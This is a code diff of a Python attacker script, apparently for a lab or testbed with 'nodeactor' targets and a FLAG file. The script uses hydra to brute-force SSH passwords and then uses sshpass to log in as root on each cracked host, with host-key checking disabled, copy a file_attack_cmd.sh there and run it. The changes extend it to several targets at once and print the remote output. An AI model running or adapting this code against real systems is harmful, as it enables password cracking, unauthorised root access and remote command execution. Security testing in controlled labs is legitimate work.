@@ -8,13 +8,20 @@ def main():
   # Load argparse
   parser = argparse.ArgumentParser(description='Run hydra to crack SSH passwords')
   # Add nodeactor name target of the attack
-  parser.add_argument('nodeactor_target', type=str, help='The name of the nodeactor to attack')
+  parser.add_argument(
+    'nodeactor_target_list',
+    metavar='nodeactor_target',
+    type=str,
+    nargs='+',
+    help='Nodeactor target of the attack')
+  # Example of usage: python3 attacker.py nodeactor1 nodeactor2 nodeactor3
+
   parser.add_argument("--skip_hydra", action="store_true", help="Skip hydra and just copy the FLAG file")
 
   args = parser.parse_args()
 
   skip_hydra = args.skip_hydra
-  nodeactor_target = args.nodeactor_target
+  nodeactor_target_list = args.nodeactor_target_list
   # Set the log file name
   log_hydra_fname = 'log_hydra.txt'
   # Other examples that could be uncommented
@@ -29,7 +36,7 @@ def main():
 
   vulnerable_ips = []
   for nodeactor_name, nodeactor_data in IP_LIST_DATA.items():
-    if nodeactor_name != nodeactor_target:
+    if nodeactor_name not in nodeactor_target_list:
       continue
     for pod in nodeactor_data:
       # find the ip address related to net1
@@ -119,30 +126,6 @@ def main():
             f'root@{target_ip}:/file_attack_cmd.sh'])
 
   for target_ip, ssh_password in found_pwd.items():
-
-          # subprocess.run([
-          #   'sshpass',
-          #   '-p',
-          #   ssh_password,
-          #   'ssh',
-          #   '-o',
-          #   'StrictHostKeyChecking=no',
-          #   f'root@{target_ip}',
-          #   command])
-
-          # subprocess.Popen([
-          #   'sshpass',
-          #   '-p',
-          #   ssh_password,
-          #   'ssh',
-          #   '-o',
-          #   'StrictHostKeyChecking=no',
-          #   f'root@{target_ip}',
-          #   "bash /file_attack_cmd.sh"],
-          #   stdout=subprocess.PIPE,
-          #   stderr=subprocess.STDOUT,
-          #   stdin=subprocess.DEVNULL)
-
           subprocesses.append(subprocess.Popen([
               'sshpass',
               '-p',
@@ -160,6 +143,10 @@ def main():
   for ip, process in zip(found_pwd.keys(), subprocesses):
     print(f"Waiting for process in {ip} to finish")
     process.wait()
+    print(f"Process in {ip} finished")
+    print(f"Output:")
+    print(process.stdout.read().decode('utf-8'))
+
 
   print("All processes finished")
 
